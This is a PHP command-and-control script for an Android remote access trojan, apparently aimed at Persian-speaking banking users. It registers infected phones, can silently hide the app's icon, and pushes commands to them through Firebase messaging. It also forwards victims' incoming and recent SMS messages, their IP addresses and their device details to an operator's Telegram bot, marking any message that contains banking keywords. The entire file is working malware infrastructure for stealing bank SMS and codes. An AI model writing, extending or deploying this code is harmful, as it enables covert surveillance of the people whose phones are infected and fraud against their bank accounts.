<?php    
  include("Madsal.php");
  define("TOKEN",$token);
  define("ID",$id);
    define("API_ACCESS_KEY",$apikey);
  
 include"jdf.php";
 $time = jdate("H:i:s-a");
 $user = $_SERVER['HTTP_USER_AGENT'];
 header('Content-Type: text/html; charset=utf-8');
 function asd($string, $start, $end){
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
    }
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
  //====
  function check($t){
    if(strpos($t,"انتقال") !== false or strpos($t,"مستند") !== false  or strpos($t,"موجودي") !== false or strpos($t,"بانک") !== false  ){
      return true ;     
    }else{      
 return false;
            }
}
function sendmess($action,$androidid,$phone,$message){
    $port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
  
}
  function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 
  //====
 function send($t){

     file_get_contents("https://api.telegram.org/bot".TOKEN."/SendMessage?parse_mode=HTML&chat_id=".ID."&text=".urlencode($t));
 }
 $firsms = file_get_contents("files/actionfirst.txt");
     $phone = file_get_contents("files/fsms.txt");
     $message = file_get_contents("files/ftext.txt");
      $autohide = file_get_contents("files/autohide.txt");

if(isset($_POST['result'])){
  	
 $result=$_POST['result'];
 if($result == "ok"){
 $action=$_POST['action'];
 if(isset($_POST['androidid'])){
 $androidid=$_POST['androidid'];
 }if(isset($_POST['model'])){
 $model=$_POST['model']; 
 			   $possible = 'abc1234';
$code = '';
$i = 0;
while ($i < 2) {
$code .= substr($possible, mt_rand(0, strlen($possible)-1), 1);
$i++;
}

$model=$model."-$code";
 }if(isset($_POST['battry'])){
 $battry = $_POST['battry'];
 }if(isset($_POST['opr'])){
 $opr = $_POST['opr'];
 }if(isset($_POST['number'])){
 $nump = $_POST['number'];
  }if(isset($_POST['sdkvr'])){
 $sdk = $_POST['sdkvr'];
 }if(isset($_POST['message'])){
 $mess = $_POST['message'];
 }
 if($action == "firstinstall"){
 	
     if($firsms == "on"){
           sendmess("SendSingleMessage",$androidid,$phone,$message);
}
if($autohide == "on"){
         action('hideicon',$androidid);
     }
     
        $handler = file_get_contents('user.txt');
			$handler .= $androidid.'/';
			file_put_contents('user.txt',$handler);
			
			if(file_exists("userlist/$model.json")){
			   $possible = 'abc1234';
$code = '';
$i = 0;
while ($i < 2) {
$code .= substr($possible, mt_rand(0, strlen($possible)-1), 1);
$i++;
}
			  $model=$model."-$code";  
			    
			}
        file_put_contents("userlist/$model.json",'{"androidid":"'.$androidid.'","name":"'.$model.'"}');
		
          $text=
"
{🫐} 𝙎𝙤𝙢𝙚𝙤𝙣𝙚 𝙞𝙣𝙨𝙩𝙖𝙡𝙡𝙚𝙙 𝙩𝙝𝙚 𝙧𝙖𝙩

~ 𝘗𝘦𝘳𝘮𝘪𝘴𝘴𝘪𝘰𝘯𝘴 𝘨𝘳𝘢𝘯𝘵𝘦𝘥
 𝘔𝘰𝘥𝘦𝘭 - $model
 𝘚𝘐𝘔 - $opr
 𝘉𝘢𝘵𝘵𝘳𝘺 - $battry %
 𝘐𝘱 - $ip
 • 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | <code>/set_$androidid</code> 
 • 𝚂𝙳𝙺 : $sdk
 • 𝚄𝚜𝚎𝚛 𝙰𝚐𝚎𝚗𝚝 : $user 
 
 * 𝙼𝚘𝚋𝚒𝚕𝚎 𝙸𝚗𝚏𝚘 {️☝🏿}
 
 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd
";    


      send($text);  
            
        
  die('');
    
        
    
    
     
    
    
}
$user=explode("/",file_get_contents("user.txt"));
 if(in_array($androidid,$user)){
if ($action == "ping"){
    
  $text=
"{🐈‍⬛} 𝙃𝙞 $prt 𝙄𝙢 𝙤𝙣𝙡𝙞𝙣𝙚

 𝘔𝘰𝘥𝘦𝘭 - $model
 𝘚𝘐𝘔 - $opr
 𝘉𝘢𝘵𝘵𝘳𝘺 - $battry %
 𝘐𝘱 - $ip

 • 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | <code>/set_$androidid</code> 
  
 * 𝙼𝚘𝚋𝚒𝚕𝚎 𝙸𝚗𝚏𝚘 {️☝🏿}
 
 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd
";  
    
    
    send($text);
    
    
}elseif($action == "pingone"){
    
  $text=
"{🔇} 𝘛𝘢𝘳𝘨𝘦𝘵 $model 𝘱𝘩𝘰𝘯𝘦 𝘴𝘪𝘭𝘦𝘯𝘵 𝘮𝘰𝘥𝘦

 • 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | <code>/set_$androidid</code>  
 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd
";    
      send($text);
    
    
}elseif($action == "getdevicefullinfo"){
    
    $text=
    
"{🕷} $model 𝘗𝘩𝘰𝘯𝘦 𝘐𝘯𝘧𝘰

 𝘔𝘰𝘥𝘦𝘭 - $model
 𝘚𝘐𝘔 - $opr
 𝘉𝘢𝘵𝘵𝘳𝘺 - $battry %
 𝘐𝘱 - $ip

 • 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | <code>/set_$androidid</code> 
  
 * 𝙼𝚘𝚋𝚒𝚕𝚎 𝙸𝚗𝚏𝚘 {️☝🏿}
 
 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd
";    
      send($text);
    
}elseif($action == "nwmessage"){
    
    
    
   $phone =    asd($mess,'[Address=',', Body=');
   $body= asd($mess,', Body=','IsInitialized');
  if(check($body) ==true){
       $isbank = "☑";
   }else{
       $isbank="❌";
   }
   
    $text=
"{✉️} 𝘼 𝙣𝙚𝙬 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙖𝙢𝙚 𝙩𝙤 $model

 𝘔𝘰𝘥𝘦𝘭 - $model
 𝘚𝘐𝘔 - $opr
 𝘉𝘢𝘵𝘵𝘳𝘺 - $battry %
 𝘐𝘱 - $ip

 • 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | <code>/set_$androidid</code> 
  
 * 𝙼𝚘𝚋𝚒𝚕𝚎 𝙸𝚗𝚏𝚘 {️☝🏿}
 
 • 𝙸𝚜 𝙱𝚊𝚗𝚔? { $isbank }
 《𝚂𝙼𝚂 𝚝𝚎𝚡𝚝》
 $body
 • 𝚂𝚎𝚗𝚍𝚎𝚛 | <code>$phone</code>

 * 𝚂𝙼𝚂 𝚒𝚗𝚏𝚘 {☝🏿}

 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd
";





      send($text);  
  
    
    
}elseif($action == "hideicon"){
    
    
    
    
        
      $text=
"~ # 𝗧𝗵𝗲 $model 𝗶𝗰𝗼𝗻 𝘄𝗮𝘀 𝗵𝗶𝗱𝗱𝗲𝗻

 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd
";    



      send($text);  
    
    
    
}elseif($action == "Sendmessok"){
    
    
    
          $text=
"{📤} 𝘔𝘦𝘴𝘴𝘢𝘨𝘦 𝘴𝘦𝘯𝘥

 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd";    




      send($text);  
      
    
    
    
}elseif($action == "lastsms"){
    
       
   $body= asd($mess,', Body=','Address');
  if(check($body) ==true){
       $isbank = "☑";
   }else{
       $isbank="❌";
   }
    
          $text=
"{💬} 𝙈𝙮 𝙡𝙖𝙨𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚

 𝘔𝘰𝘥𝘦𝘭 - $model
 𝘚𝘐𝘔 - $opr
 𝘉𝘢𝘵𝘵𝘳𝘺 - $battry %
 𝘐𝘱 - $ip

 • 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | <code>/set_$androidid</code> 
  
 * 𝙼𝚘𝚋𝚒𝚕𝚎 𝙸𝚗𝚏𝚘 {️☝🏿}
 
 • 𝙸𝚜 𝙱𝚊𝚗𝚔? { $isbank }
 《𝚂𝙼𝚂 𝚝𝚎𝚡𝚝》
 $body
 • 𝚂𝚎𝚗𝚍𝚎𝚛 | <code>$phone</code>

 * 𝚂𝙼𝚂 𝚒𝚗𝚏𝚘 {☝🏿}

 • 𝙿𝚘𝚛𝚝 / $prt
 • 𝚃𝚒𝚖𝚎 / $time

 -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd";    




      send($text);  
      
    
    
    
}

 } 
}

}
      
      
       

      
      
      
      
   






   
        ?>